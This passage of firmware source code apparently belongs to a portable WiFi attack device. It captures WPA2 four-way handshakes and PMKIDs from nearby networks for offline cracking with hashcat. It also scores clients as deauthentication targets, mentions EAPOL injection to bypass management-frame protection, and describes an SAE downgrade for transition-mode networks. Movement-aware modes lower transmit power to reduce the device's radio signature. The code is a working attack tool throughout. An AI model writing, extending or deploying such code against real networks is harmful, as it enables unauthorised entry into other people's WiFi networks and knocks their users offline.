    if (clientMac[0] & 0x01) return;
    
    // Find network via hash and add client
    uint16_t ni = hashFindNetwork(apBssid);
    if (ni != HUNT_HASH_EMPTY) {
        uint32_t now = millis();

        // Update network activity timestamp AND channel
        // Critical: data frames are more reliable than beacons for channel detection
        networks[ni].lastSeen = now;
        networks[ni].channel = currentChannel;

        // Check if client already tracked
        bool found = false;
        for (uint8_t c = 0; c < networks[ni].clientCount; c++) {
            if (memcmp(networks[ni].clients[c].mac, clientMac, 6) == 0) {
                found = true;
                networks[ni].clients[c].lastSeen = now;
                networks[ni].clients[c].rssi = rssi;
                break;
            }
        }

        // Add new client (with LRU eviction if full)
        if (!found) {
            uint8_t slot;
            if (networks[ni].clientCount < MAX_CLIENTS_PER_NETWORK) {
                slot = networks[ni].clientCount;
                networks[ni].clientCount++;
            } else {
                uint32_t oldestTime = UINT32_MAX;
                slot = 0;
                for (uint8_t c = 0; c < MAX_CLIENTS_PER_NETWORK; c++) {
                    if (networks[ni].clients[c].lastSeen < oldestTime) {
                        oldestTime = networks[ni].clients[c].lastSeen;
                        slot = c;
                    }
                }
            }
            memcpy(networks[ni].clients[slot].mac, clientMac, 6);
            networks[ni].clients[slot].rssi = rssi;
            networks[ni].clients[slot].lastSeen = now;

            pendingClientSpotted = true;
        }
    }
}

static void handleEAPOL(const uint8_t* payload, uint16_t len, int8_t rssi) {
    // Full handshake capture implementation - aligned with Porkchop/hcxtools

    if (len < 40 || !pendingHandshakes) return;
    
    // Extract ToDS/FromDS flags
    uint8_t toDs = (payload[1] & 0x01);
    uint8_t fromDs = (payload[1] & 0x02) >> 1;
    
    // Extract source/dest MACs based on direction
    const uint8_t* srcMac;
    const uint8_t* dstMac;
    const uint8_t* bssid;
    
    if (toDs && !fromDs) {
        // To DS: STA -> AP (RA=BSSID, TA=SA)
        dstMac = payload + 4;
        srcMac = payload + 10;
        bssid = payload + 4;
    } else if (!toDs && fromDs) {
        // From DS: AP -> STA (RA=DA, TA=BSSID)
        dstMac = payload + 4;
        srcMac = payload + 10;
        bssid = payload + 10;
    } else if (!toDs && !fromDs) {
        // IBSS/Direct Link
        dstMac = payload + 4;
        srcMac = payload + 10;
        bssid = payload + 16;
    } else {
        return;  // WDS (both set) - skip
    }
    
    // Calculate data offset - detect QoS and HTC
    uint16_t offset = 24;  // Base 802.11 header
    
    // Check for QoS Data (subtype bit 3 set)
    uint8_t subtype = (payload[0] >> 4) & 0x0F;
    bool isQoS = (subtype & 0x08) != 0;
    if (isQoS) offset += 2;
    
    // Check for HTC (QoS + Order bit set)
    if (isQoS && (payload[1] & 0x80)) offset += 4;
    
    if (offset + 8 > len) return;
    
    // Verify LLC/SNAP header: AA AA 03 00 00 00 88 8E
    if (payload[offset] != 0xAA || payload[offset+1] != 0xAA ||
        payload[offset+2] != 0x03 || payload[offset+3] != 0x00 ||
        payload[offset+4] != 0x00 || payload[offset+5] != 0x00 ||
        payload[offset+6] != 0x88 || payload[offset+7] != 0x8E) {
        return;  // Not EAPOL
    }
    
    // EAPOL payload starts after LLC/SNAP
    const uint8_t* eapol = payload + offset + 8;
    uint16_t eapolLen = len - offset - 8;
    
    if (eapolLen < 4) return;
    
    // Verify EAPOL type (0x03 = EAPOL-Key)
    uint8_t type = eapol[1];
    if (type != 0x03) return;
    
    // Parse Key Info (offset 5-6 in EAPOL-Key, big-endian)
    if (eapolLen < 7) return;
    uint16_t keyInfo = (eapol[5] << 8) | eapol[6];
    
    // Determine message number from key info flags
    // Bit 6: Install, Bit 7: ACK, Bit 8: MIC, Bit 9: Secure
    uint8_t install = (keyInfo >> 6) & 0x01;
    uint8_t keyAck = (keyInfo >> 7) & 0x01;
    uint8_t keyMic = (keyInfo >> 8) & 0x01;
    uint8_t secure = (keyInfo >> 9) & 0x01;
    
    uint8_t messageNum = 0;
    if (keyAck && !keyMic) {
        messageNum = 1;  // AP -> STA, ANonce (no MIC)
    } else if (!keyAck && keyMic && !secure) {
        messageNum = 2;  // STA -> AP, SNonce + MIC
    } else if (keyAck && keyMic && install) {
        messageNum = 3;  // AP -> STA, Install key
    } else if (!keyAck && keyMic && secure) {
        messageNum = 4;  // STA -> AP, Confirmation
    }
    
    if (messageNum == 0) return;

    // EAPOL diagnostics — count each message type
#if HAMLET_DEBUG_LOG
    eapolCallbackHits++;
    if (messageNum == 1) eapolRxM1++;
    else if (messageNum == 2) eapolRxM2++;
    else if (messageNum == 3) eapolRxM3++;
    else if (messageNum == 4) eapolRxM4++;
#endif

    // Determine BSSID and station based on message direction
    // M1/M3 = AP->Station (srcMac=AP), M2/M4 = Station->AP (dstMac=AP)
    const uint8_t* apBssid;
    const uint8_t* sta;
    if (messageNum == 1 || messageNum == 3) {
        apBssid = srcMac;
        sta = dstMac;
    } else {
        apBssid = dstMac;
        sta = srcMac;
    }
    
    uint32_t now = millis();
    uint32_t nowEpoch = getTrustedEpochFromCache(now);

    // Find or create pending handshake entry
    PendingHandshake* pending = nullptr;
    bool clientIsNew = false;

    portENTER_CRITICAL(&hsMux);

    for (uint8_t i = 0; i < MAX_PENDING_HANDSHAKES; i++) {
        if (pendingHandshakes[i].active &&
            memcmp(pendingHandshakes[i].bssid, apBssid, 6) == 0 &&
            memcmp(pendingHandshakes[i].station, sta, 6) == 0) {
            pending = &pendingHandshakes[i];
            break;
        }
    }

    // Create new pending entry if not found
    if (pending == nullptr) {
        // Find free slot or evict oldest
        uint32_t oldest = UINT32_MAX;
        uint8_t oldestIdx = 0;

        for (uint8_t i = 0; i < MAX_PENDING_HANDSHAKES; i++) {
            if (!pendingHandshakes[i].active) {
                pending = &pendingHandshakes[i];
                break;
            }
            if (pendingHandshakes[i].firstSeenMs < oldest) {
                oldest = pendingHandshakes[i].firstSeenMs;
                oldestIdx = i;
            }
        }

        if (pending == nullptr) {
            // Evict oldest
            pending = &pendingHandshakes[oldestIdx];
        }

        // Initialize new entry
        memset(pending, 0, sizeof(PendingHandshake));
        memcpy(pending->bssid, apBssid, 6);
        memcpy(pending->station, sta, 6);
        pending->firstSeenMs = now;
        pending->lastSeenMs = now;
        pending->firstSeenEpoch = nowEpoch;
        pending->lastSeenEpoch = nowEpoch;
        pending->active = true;
        pending->captureChannel = currentChannel;      // Lock in capture context
        pending->captureBehavior = currentBehavior;    // For correct D-UCB attribution

        // Find network SSID via hash (read-only, safe in callback).
        // Client-add is deferred to update() via pendingClientQueue to avoid
        // concurrent writes to networks[] from callback (core 0) + main loop (core 1).
        uint16_t ei = hashFindNetwork(apBssid);
        if (ei != HUNT_HASH_EMPTY) {
            strncpy(pending->ssid, networks[ei].ssid, 32);
            pending->ssid[32] = '\0';
            // Defer client add — will be committed in update() → drainPendingClients()
            queueClientAdd(apBssid, sta, rssi, now);
            clientIsNew = true;  // conservatively assume new for Mood trigger
        }

        if (pending->ssid[0] == '\0') {
            strncpy(pending->ssid, "<unknown>", sizeof(pending->ssid) - 1);
            pending->ssid[sizeof(pending->ssid) - 1] = '\0';
        }
    }

    pending->lastSeenMs = now;
    if (nowEpoch != 0) {
        if (pending->firstSeenEpoch == 0) pending->firstSeenEpoch = nowEpoch;
        pending->lastSeenEpoch = nowEpoch;
    }

    // Check if this message already captured
    if (pending->capturedMask & (1 << (messageNum - 1))) {
        portEXIT_CRITICAL(&hsMux);
        return;  // Already have this message
    }

    // Store the EAPOL frame
    EAPOLFrame* frame = &pending->frames[messageNum - 1];

    uint16_t copyLen = eapolLen;
    if (copyLen > sizeof(frame->data)) copyLen = sizeof(frame->data);
    memcpy(frame->data, eapol, copyLen);
    frame->len = copyLen;

    // Store full 802.11 frame for hashcat
    uint16_t fullCopyLen = len;
    if (fullCopyLen > sizeof(frame->fullFrame)) fullCopyLen = sizeof(frame->fullFrame);
    memcpy(frame->fullFrame, payload, fullCopyLen);
    frame->fullFrameLen = fullCopyLen;

    frame->messageNum = messageNum;
    frame->rssi = rssi;
    frame->timestamp = nowEpoch;
    pending->frameSeenMs[messageNum - 1] = now;

    // Update captured mask
    pending->capturedMask |= (1 << (messageNum - 1));

    // Copy handshake state under spinlock for deferred processing
    uint8_t hs_capturedMask = pending->capturedMask;
    uint8_t hs_bssid[6];
    uint8_t hs_station[6];
    char hs_ssid[33];
    memcpy(hs_bssid, pending->bssid, 6);
    memcpy(hs_station, pending->station, 6);
    memcpy(hs_ssid, pending->ssid, 33);

    portEXIT_CRITICAL(&hsMux);

    // ==[ PMKID FROM M1 KEY DATA ]== Most APs include PMKID in M1 as a PMK caching
    // optimization. This is the primary PMKID extraction path (assoc response is fallback).
    // KDE format: DD <len> 00-0F-AC 04 <16-byte PMKID>
    if (messageNum == 1 && eapolLen >= 99) {
        uint16_t keyDataLen = (eapol[97] << 8) | eapol[98];
        if (keyDataLen > 0 && 99 + keyDataLen <= eapolLen) {
            const uint8_t* kd = eapol + 99;
            uint16_t kdPos = 0;
            while (kdPos + 6 <= keyDataLen) {  // minimum KDE: type(1) + len(1) + OUI(3) + type(1)
                uint8_t kdeType = kd[kdPos];
                uint8_t kdeLen = kd[kdPos + 1];
                if (kdeLen == 0 || kdPos + 2 + kdeLen > keyDataLen) break;
                // PMKID KDE: type=0xDD, OUI=00:0F:AC, data type=0x04, payload=16 bytes
                if (kdeType == 0xDD && kdeLen >= 20 &&
                    kd[kdPos + 2] == 0x00 && kd[kdPos + 3] == 0x0F &&
                    kd[kdPos + 4] == 0xAC && kd[kdPos + 5] == 0x04) {
                    // Found PMKID — stage for deferred processing
                    if (!pendingPMKID.ready) {
                        memcpy(pendingPMKID.bssid, hs_bssid, 6);
                        memcpy(pendingPMKID.station, hs_station, 6);
                        memcpy(pendingPMKID.pmkidBytes, kd + kdPos + 6, 16);
                        pendingPMKID.isFirstCapture = (sessionPMKIDs == 0 && sessionHandshakes == 0);
                        pendingPMKID.totalLifetime = 0;  // filled in update()
                        sessionPMKIDs++;
                        channelStats[currentChannel].pmkidHits++;
                        pendingPMKIDBeep = true;
                        pendingPMKID.ready = true;
                    }
                    break;
                }
                kdPos += 2 + kdeLen;
            }
        }
    }

    // New client spotted — defer Mood/SFX to update() (not callback-safe)
    if (clientIsNew) {
        pendingClientSpotted = true;
    }

    // === PROGRESSIVE AUDIO FEEDBACK (Chef's Kiss) ===
    // Each M frame = tick building anticipation toward jackpot
    // M1-M3 = progressive ticks, M4 handled by pendingHandshakeBeep (jackpot)
    if (messageNum <= 3) {
        pendingEAPOLTick = messageNum;  // 1=single tick, 2=double, 3=triple
    }
    // Note: M4 audio is triggered later when full handshake saved (pendingHandshakeBeep)

    // Update client lastSeen — deferred to update() via pendingClientQueue
    // (avoids concurrent write to networks[] from callback core)
    queueClientAdd(apBssid, sta, rssi, now);

    // If M2 captured, defer retry clear to update() (shared state, not callback-safe)
    if (messageNum == 2 && !pendingClearRetry) {
        memcpy((uint8_t*)pendingClearRetryBSSID, hs_bssid, 6);
        memcpy((uint8_t*)pendingClearRetryStation, hs_station, 6);
        pendingClearRetry = true;
    }

    // Stage M1234 progress for update() (Mood/Avatar not callback-safe).
    // Mux pairs with main-loop snapshot — prevents torn read of 33-byte SSID.
    portENTER_CRITICAL(&pendingHSMux);
    pendingHSMask = hs_capturedMask;
    memcpy((char*)pendingHSSSID, hs_ssid, 33);
    portEXIT_CRITICAL(&pendingHSMux);
    pendingHSProgress = true;
    
    // === CHECK FOR VALID CRACKABLE HANDSHAKE PAIR ===
    // PTK = PRF(PMK, AA, SA, ANonce, SNonce)
    // - ANonce is in M1 and M3 (from AP)
    // - SNonce is in M2 ONLY (from STA) - M4 typically has zero nonce!
    //
    // Valid pairs:
    //   M1+M2: ANonce from M1, SNonce from M2 ✅ BEST
    //   M2+M3: SNonce from M2, ANonce from M3 ✅ GOOD
    //   M3+M4: ONLY if M4 has SNonce (rare - most clients zero it) ⚠️
    //   M1+M4: ONLY if M4 has SNonce (rare - most clients zero it) ⚠️
    //
    // CRITICAL: M1+M4 or M3+M4 without SNonce = UNCRACKABLE!
    // wpa-sec will reject it, hashcat will fail
    bool hasValidPair = false;
    bool hasM2 = (pending->capturedMask & 0x02) != 0;
    
    // M1+M2 or M2+M3: Always valid (M2 has SNonce)
    if ((pending->capturedMask & 0x03) == 0x03 ||  // M1+M2 (best)
        (pending->capturedMask & 0x06) == 0x06) {  // M2+M3
        hasValidPair = true;
    }
    // M3+M4: Valid if we also have M2, OR if M4 has non-zero nonce
    else if ((pending->capturedMask & 0x0C) == 0x0C) {  // M3+M4
        if (hasM2) {
            hasValidPair = true;  // M2 provides SNonce
        } else {
            // Check if M4's nonce is non-zero (some clients copy SNonce to M4)
            bool m4HasSnonce = !isNonceZero(pending->frames[3].data, pending->frames[3].len);
            if (m4HasSnonce) {
                hasValidPair = true;
            } else {
                pendingNeedM2 = 1;  // deferred: "M3+M4 NEED M2!"
            }
        }
    }
    // M1+M4: Valid if we also have M2, OR if M4 has non-zero nonce
    else if ((pending->capturedMask & 0x09) == 0x09) {  // M1+M4
        if (hasM2) {
            hasValidPair = true;  // M2 provides SNonce
        } else {
            // Check if M4's nonce is non-zero
            bool m4HasSnonce = !isNonceZero(pending->frames[3].data, pending->frames[3].len);
            if (m4HasSnonce) {
                hasValidPair = true;
            } else {
                pendingNeedM2 = 2;  // deferred: "M1+M4 NEED M2!"
            }
        }
    }
    
    // If we have a valid pair but haven't marked complete time yet, start grace period
    if (hasValidPair && pending->completeTimeMs == 0) {
        pending->completeTimeMs = millis();
    }

    // ==[ D-UCB PARTIAL REWARD ]== Signal that this channel showed promise
    // Record when M1+M2 or M2+M3 detected (have SNonce, good crackable pairs)
    // Only record once per pending handshake to avoid inflating scores
    // Deferred: recordPartialReward writes ChannelArm floats (not callback-safe)
    if (hasValidPair && !pending->partialRewardRecorded) {
        pending->partialRewardRecorded = true;
        portENTER_CRITICAL(&pendingPartialMux);
        pendingPartialChannel = pending->captureChannel;
        pendingPartialBonus = PARTIAL_REWARD_BONUS;
        pendingPartialReward = true;
        portEXIT_CRITICAL(&pendingPartialMux);
    }
}

static bool selectProbeTarget(bool sameChannelOnly) {
    DetectedNetwork* best = nullptr;
    uint32_t bestScore = 0;

    for (uint16_t i = 0; i < networkCount; i++) {
        if (sameChannelOnly && networks[i].channel != currentChannel) continue;
        if (isEligibleForProbe(&networks[i])) {
            uint32_t score = calculateProbeScore(&networks[i]);
            if (score > bestScore) {
                bestScore = score;
                best = &networks[i];
            }
        }
    }

    if (best != nullptr) {
        probeTarget = best;
        return true;
    }

    return false;
}

static bool isEligibleForProbe(const DetectedNetwork* net) {
    // ==[ MULTI-PROBE ]== attempt counter + exponential backoff (OPT-1)

    // RSSI threshold
    if (net->rssi < Config::getProbeThreshold()) return false;

    // Auth mode: need WPA2 AKM for PMKID association
    if (net->authmode != WIFI_AUTH_WPA2_PSK &&
        net->authmode != WIFI_AUTH_WPA_WPA2_PSK &&
        net->authmode != WIFI_AUTH_WPA2_WPA3_PSK) return false;

    // PMF guard: skip PMF networks UNLESS transition mode
    if (net->hasPMF && net->authmode != WIFI_AUTH_WPA2_WPA3_PSK) return false;

    // Terminal: PMKID already extracted
    if (net->gotPMKIDResponse) return false;

    // Max attempts reached
    if (net->probeAttempts >= PROBE_MAX_ATTEMPTS) return false;

    // AP responded but no PMKID after 3 tries — probably doesn't support it
    if (net->gotResponse && net->probeAttempts >= 3) return false;

    // Exponential backoff for retries: 3s, 6s
    if (net->probeAttempts > 0) {
        uint32_t backoff = PROBE_BACKOFF_BASE << (net->probeAttempts - 1);
        if (millis() - net->lastProbeTime < backoff) return false;
    }

    // Need SSID
    if (net->isHidden && !net->wasRevealed) return false;

    // Need some beacons
    if (net->beaconCount < MIN_BEACONS_FOR_PROBE) return false;

    // Fresh (seen recently)
    if (millis() - net->lastSeen > NETWORK_STALE_MS) return false;

    return true;
}

static float getProbeAuthValue(const DetectedNetwork* net) {
    // transition+PMF = highest (PMKID is ONLY capture path, deauth blocked)
    if (net->authmode == WIFI_AUTH_WPA2_WPA3_PSK && net->hasPMF) return PROBE_AUTH_TRANSITION_PMF;
    if (net->authmode == WIFI_AUTH_WPA2_PSK)       return PROBE_AUTH_WPA2;
    if (net->authmode == WIFI_AUTH_WPA2_WPA3_PSK)  return PROBE_AUTH_TRANSITION;
    if (net->authmode == WIFI_AUTH_WPA_WPA2_PSK)   return PROBE_AUTH_MIXED;
    return PROBE_AUTH_DEFAULT;
}

static uint32_t calculateProbeScore(const DetectedNetwork* net) {
    // normalized [0, 1] composite -- cast to uint32 * 10000 for existing API compat
    float rssi    = clamp01((net->rssi + CQ_RSSI_OFFSET) / CQ_RSSI_RANGE);
    float auth    = getProbeAuthValue(net);
    float fresh   = clamp01(1.0f - (float)(millis() - net->lastSeen) / (float)NETWORK_STALE_MS);
    float confirm = clamp01((float)net->beaconCount / CQ_DENSITY_REF);

    float composite = PROBE_RSSI_WEIGHT * rssi + PROBE_AUTH_WEIGHT * auth + PROBE_FRESH_WEIGHT * fresh + PROBE_CONFIRM_WEIGHT * confirm;

    // OPT-1: retry bonus for responsive APs without PMKID (worth another try)
    if (net->probeAttempts > 0 && net->gotResponse && !net->gotPMKIDResponse) {
        composite += PROBE_RETRY_BONUS;
    }

    return (uint32_t)(composite * PROBE_SCORE_SCALE);
}

// === DEAUTH (MUDBALL) HELPER FUNCTIONS ===

static uint32_t hashClientBSSID(const uint8_t* bssid, const uint8_t* client) {
    // FNV-1a hash of both MAC addresses combined
    uint32_t h = 2166136261;
    for (int i = 0; i < 6; i++) {
        h ^= bssid[i];
        h *= 16777619;
    }
    for (int i = 0; i < 6; i++) {
        h ^= client[i];
        h *= 16777619;
    }
    return h;
}

static bool isAlreadyDeauthed(const uint8_t* bssid, const uint8_t* client) {
    if (!deauthCache) return false;
    uint32_t h = hashClientBSSID(bssid, client);
    uint32_t now = millis();
    for (uint16_t i = 0; i < deauthedCount; i++) {
        if (deauthCache[i].hash == h) {
            // allow re-deauth after cooldown expires
            if (now - deauthCache[i].timestamp > DEAUTH_COOLDOWN_MS) {
                // expired — remove entry, allow fresh deauth
                deauthCache[i] = deauthCache[deauthedCount - 1];
                deauthedCount--;
                return false;
            }
            return true;
        }
    }
    return false;
}

static void markAsDeauthed(const uint8_t* bssid, const uint8_t* client) {
    if (!deauthCache) return;
    uint32_t h = hashClientBSSID(bssid, client);
    uint32_t now = millis();

    // update existing entry timestamp if found
    for (uint16_t i = 0; i < deauthedCount; i++) {
        if (deauthCache[i].hash == h) {
            deauthCache[i].timestamp = now;
            return;
        }
    }

    if (deauthedCount >= DEAUTH_CACHE_SIZE) {
        // LRU eviction — find oldest entry
        uint16_t oldest = 0;
        for (uint16_t i = 1; i < deauthedCount; i++) {
            if (deauthCache[i].timestamp < deauthCache[oldest].timestamp) {
                oldest = i;
            }
        }
        deauthCache[oldest] = {h, now};
        return;
    }
    deauthCache[deauthedCount++] = {h, now};
}

static bool isEligibleForDeauth(const DetectedNetwork* net, uint8_t clientIdx) {
    // Check all eligibility criteria
    
    // Need valid network
    if (net == nullptr) return false;
    
    // === PMF EXCLUSION ===
    // PMF networks immune to deauth management frames. EAPOL injection bypasses via data frames.
    if (net->hasPMF && !Config::getEAPOLInjectionEnabled()) return false;

    // === WPA3 EXCLUSION ===
    // WPA3-SAE mandates PMF. EAPOL injection can still disrupt sessions.
    if (net->authmode == WIFI_AUTH_WPA3_PSK && !Config::getEAPOLInjectionEnabled()) return false;
    
    // Need WPA2+ auth (not open, not WEP)
    // WPA3-only accepted when EAPOL injection available (data frames bypass PMF)
    if (net->authmode != WIFI_AUTH_WPA2_PSK &&
        net->authmode != WIFI_AUTH_WPA_WPA2_PSK &&
        net->authmode != WIFI_AUTH_WPA2_WPA3_PSK &&
        !(net->authmode == WIFI_AUTH_WPA3_PSK && Config::getEAPOLInjectionEnabled())) {
        return false;
    }
    
    // Already got handshake from this network?
    if (net->hasHandshake) return false;
    
    // Need valid client
    if (clientIdx >= net->clientCount) return false;
    
    // Not already deauthed this client
    if (isAlreadyDeauthed(net->bssid, net->clients[clientIdx].mac)) return false;
    
    // Client seen recently (active connection)
    // Phase 5: Motion-aware client staleness
    // Walking fast = shorter window (clients go stale quickly as we move)
    // Stationary = longer window (clients stay relevant)
    uint32_t clientFreshness;
    if (currentBehavior == HuntBehavior::CAMP || currentBehavior == HuntBehavior::LURK) {
        clientFreshness = CLIENT_FRESH_CAMP;  // 15s when stationary/focused
    } else {
        // PATROL/SPRINT: scale by step rate
        // 0 steps/sec = 8s, 2+ steps/sec = 4s
        float stepRate = Pedometer::getStepsPerSecond();
        uint32_t baseFreshness = CLIENT_FRESH_BASE;
        uint32_t reduction = min((uint32_t)(stepRate * 2000), CLIENT_FRESH_MAX_REDUCE);
        clientFreshness = baseFreshness - reduction;
    }
    uint32_t clientAge = millis() - net->clients[clientIdx].lastSeen;
    if (clientAge > clientFreshness) {
        return false;
    }
    
    // Motion-adaptive RSSI threshold
    // CAMP: accept weaker signals (-80), PATROL: only strong (-65)
    int8_t rssiThreshold = getAdaptiveRSSIThreshold();
    if (net->rssi < rssiThreshold) return false;
    
    // Client RSSI check - weak clients unlikely to produce capturable M2
    // Use relaxed threshold (client TX power typically 10dB lower than AP)
    if (net->clients[clientIdx].rssi < rssiThreshold - 10) return false;
    
    return true;
}

// C5Monster (isEligibleForSAE) removed from capture loop — DoS has P(capture) = 0.
// SAE downgrade (passive reject in callback) remains active for transition networks.

static bool selectDeauthTarget() {
    DetectedNetwork* best = nullptr;
    uint8_t bestClientIdx = 0;
    uint32_t bestScore = 0;
    
    for (uint16_t i = 0; i < networkCount; i++) {
        DetectedNetwork* net = &networks[i];

        // current-channel-only: skip off-channel targets — no hop, fire within dwell
        if (net->channel != currentChannel) continue;
        
        // Check each client
        for (uint8_t c = 0; c < net->clientCount; c++) {
            if (isEligibleForDeauth(net, c)) {
                // normalized [0, 1+] composite scoring
                uint32_t now = millis();

                // signal quality: weakest link of AP + client
                float apRSSI = clamp01((net->rssi + CQ_RSSI_OFFSET) / CQ_RSSI_RANGE);
                float clRSSI = clamp01((net->clients[c].rssi + CQ_RSSI_OFFSET) / CQ_RSSI_RANGE);
                float signal = fminf(apRSSI, clRSSI);

                // target value (reuses getTargetValue from CQS)
                float value = getTargetValue(net);

                // client freshness
                float clientAge = (float)(now - net->clients[c].lastSeen) / (float)CLIENT_FRESH_CAMP;
                float freshness = clamp01(1.0f - clientAge);

                // approach trend
                float trend = 0.5f;
                if (net->beaconCount > 4 && net->rssiTrend != 0) {
                    trend = clamp01(0.5f + (float)net->rssiTrend / 20.0f);
                }

                // client density
                float density = clamp01(log2f(1.0f + (float)net->clientCount) / 3.0f);

                float composite = DEAUTH_SIGNAL_WEIGHT * signal + DEAUTH_VALUE_WEIGHT * value + DEAUTH_FRESH_WEIGHT * freshness
                                + DEAUTH_TREND_WEIGHT * trend + DEAUTH_DENSITY_WEIGHT * density;

                // scale to uint32 for existing comparisons
                uint32_t score = (uint32_t)(composite * DEAUTH_SCORE_SCALE);

                if (score > bestScore) {
                    bestScore = score;
                    best = net;
                    bestClientIdx = c;
                }
            }
        }
    }
    
    if (best != nullptr) {
        deauthTarget = best;
        deauthClientIdx = bestClientIdx;
#if HAMLET_DEBUG_LOG
        deauthTargetHits++;
#endif
        HAMLET_LOGF("[DEAUTH] target: %s ch%d client=%02X:%02X:%02X:%02X:%02X:%02X clients=%d\n",
                      best->ssid, best->channel,
                      best->clients[bestClientIdx].mac[0], best->clients[bestClientIdx].mac[1],
                      best->clients[bestClientIdx].mac[2], best->clients[bestClientIdx].mac[3],
                      best->clients[bestClientIdx].mac[4], best->clients[bestClientIdx].mac[5],
                      best->clientCount);
        return true;
    }

#if HAMLET_DEBUG_LOG
    deauthTargetMiss++;
#endif

    return false;
}

// === ADAPTIVE HUNT HELPER FUNCTIONS ===

// ==[ LURK HELPERS ]==

// Check if a network qualifies for auto-LURK (CAMP only, strong signal, multiple clients)
static bool shouldAutoLurk(uint32_t now) {
    if (currentBehavior != HuntBehavior::CAMP) return false;

    for (uint16_t i = 0; i < networkCount; i++) {
        const DetectedNetwork& net = networks[i];
        if (net.channel != currentChannel) continue;
        if (net.hasHandshake && net.hasPMKID) continue;  // already fully captured
        if (net.rssi < LURK_AUTO_RSSI_THRESH) continue;    // strict signal requirement
        if (net.clientCount < LURK_AUTO_MIN_CLIENTS) continue;  // need multiple clients
        if (now - net.lastSeen > LURK_FRESH_MS) continue;       // must be fresh

        // compute target value (reuse from CQS)
        float tv = getTargetValue(&net);
        if (tv < LURK_AUTO_MIN_TV) continue;  // high-value only

        // signal + value composite > threshold
        float rssiNorm = clamp01((net.rssi + CQ_RSSI_OFFSET) / CQ_RSSI_RANGE);
        float score = 0.5f * rssiNorm + 0.5f * tv;
        if (score > LURK_AUTO_SCORE_THRESH) return true;
    }
    return false;
}

// Track best RSSI of any network on the LURK channel (for exit condition)
static int8_t getLurkBestRSSI(uint32_t now) {
    int8_t best = -127;
    for (uint16_t i = 0; i < networkCount; i++) {
        if (networks[i].channel == lurkChannel &&
            now - networks[i].lastSeen < LURK_RSSI_TIMEOUT &&
            networks[i].rssi > best) {
            best = networks[i].rssi;
        }
    }
    return best;
}

static bool channelAllowedByFlock(uint8_t ch) {
    if (ch < 1 || ch > 13) return false;
    NowFlock::Status st = NowFlock::getStatus();
    if (!st.initialized || st.channelMask == 0) return true;
    return (st.channelMask & (uint16_t)(1u << ch)) != 0;
}

static void enterLurk(uint8_t channel) {
    lurkActive = true;
    lurkChannel = channel;
    lurkStartTime = millis();
    lurkTimeout = LURK_TIMEOUT_AUTO;
    lurkRSSILostTime = 0;
    lurkTargetRSSI = LURK_INITIAL_RSSI;  // will be updated each tick
    channelHopping = false;

    DetectedNetwork* best = nullptr;
    float bestTv = 0.0f;
    for (uint16_t i = 0; i < networkCount; i++) {
        DetectedNetwork& net = networks[i];
        if (net.channel != channel) continue;
        float tv = getTargetValue(&net);
        if (tv > bestTv) {
            bestTv = tv;
            best = &net;
        }
    }
    if (best != nullptr) {
        NowFlock::broadcastTarget(best->bssid, best->channel);
    }
}

static void exitLurk() {
    lurkActive = false;
    lurkRSSILostTime = 0;
    channelHopping = true;
}

static void switchBehavior(HuntBehavior newBehavior) {
    if (newBehavior == currentBehavior) return;
    currentBehavior = newBehavior;
    transitionDebounce = 0;

    // ==[ BURST WINDOW RESET ]== behavior change implies context change (user
    // stopped walking / started moving). The 5s novel-BSSID burst counter
    // shouldn't leak across the transition; otherwise a 4th new SSID observed
    // seconds AFTER the mode shift would trigger an alpha reset attributed to
    // pre-transition exploration.
    burstNewCount = 0;
    burstWindowStart = 0;

    // ==[ LURK TX SCALING ]== target is nearby, save battery + reduce RF signature
    if (newBehavior == HuntBehavior::LURK) {
        Power::setTxPower(Power::TxPower::TX_MED);   // 10dBm vs 20dBm
    } else {
        Power::setTxPower(Power::TxPower::TX_MAX);   // full power for normal ops
    }

    // ==[ CPU CADENCE ]== every behavior renders the 60fps HUNT scene. LURK
    // already saves current above by reducing TX; do not starve presentation.
    Power::setCpuFrequency(Power::CpuFreq::FAST);

    // Announce mode change: 0=CAMP, 1=PATROL, 2=SPRINT, 3=LURK
    Mood::onModeChange((uint8_t)newBehavior);
    Haptic::bump();  // tactile behavior shift

    // tree: show in CAMP if clients exist, hide in other modes
    if (currentBehavior == HuntBehavior::CAMP && !Weather::isTreeSuppressed()) {
        uint8_t fruits = getTreeFruitCount();
        if (fruits > 0) {
            Avatar::showTree(fruits);
            treeVisible = true;
        }
    } else if (treeVisible) {
        Avatar::hideTree();
        treeVisible = false;
    }

    // Re-prime exposure ticking for new tick cadence
    uint32_t tickMs = getTickMs();
    lastExposureTick = millis();
    if (lastExposureTick > tickMs) lastExposureTick -= tickMs;
}

static void updateBehavior() {
    if (!Config::getAdaptiveHunt()) return;

    uint32_t now = millis();

    // ==[ LURK EXIT CONDITIONS ]== check before normal FSM
    if (currentBehavior == HuntBehavior::LURK) {
        // Exit 1: timeout
        if (now - lurkStartTime > lurkTimeout) {
            exitLurk();
            switchBehavior(HuntBehavior::CAMP);
            return;
        }
        // Exit 2: RSSI loss (walked away from target)
        int8_t bestRSSI = getLurkBestRSSI(now);
        lurkTargetRSSI = bestRSSI;
        int8_t exitThresh = LURK_EXIT_RSSI_NORMAL;
        if (bestRSSI < exitThresh) {
            if (lurkRSSILostTime == 0) {
                lurkRSSILostTime = now;
            } else if (now - lurkRSSILostTime > LURK_RSSI_TIMEOUT) {
                // RSSI below threshold for 10s — target gone
                exitLurk();
                switchBehavior(HuntBehavior::CAMP);
                return;
            }
        } else {
            lurkRSSILostTime = 0;  // reset if signal recovered
        }
        // Exit 3: target captured (checked elsewhere on capture event)
        // Stay in LURK — no normal FSM transitions
        return;
    }

    // ==[ LURK ENTRY ]== from CAMP only
    if (currentBehavior == HuntBehavior::CAMP) {
        // Auto-LURK: high-value target on current channel
        if (shouldAutoLurk(now)) {
            enterLurk(currentChannel);
            switchBehavior(HuntBehavior::LURK);
            return;
        }
    }

    // ==[ NORMAL FSM ]== CAMP ↔ PATROL ↔ SPRINT (motion-driven)
    MotionState motion = Pedometer::getMotionState();
    motionStationary = (motion != MotionState::WALKING);
    float sps = Pedometer::getStepsPerSecond();
    HuntBehavior desired;

    if (motion == MotionState::WALKING) {
        desired = (sps > SPRINT_SPS_THRESHOLD) ? HuntBehavior::SPRINT : HuntBehavior::PATROL;
    } else {
        desired = HuntBehavior::CAMP;
    }

    if (desired != currentBehavior) {
        if (desired == pendingBehavior) {
            transitionDebounce++;
            // debounce threshold depends on transition type
            uint8_t threshold;
            if (desired == HuntBehavior::SPRINT) {
                threshold = DEBOUNCE_PATROL_TO_SPRINT;
            } else if (desired == HuntBehavior::CAMP) {
                threshold = DEBOUNCE_PATROL_TO_CAMP;
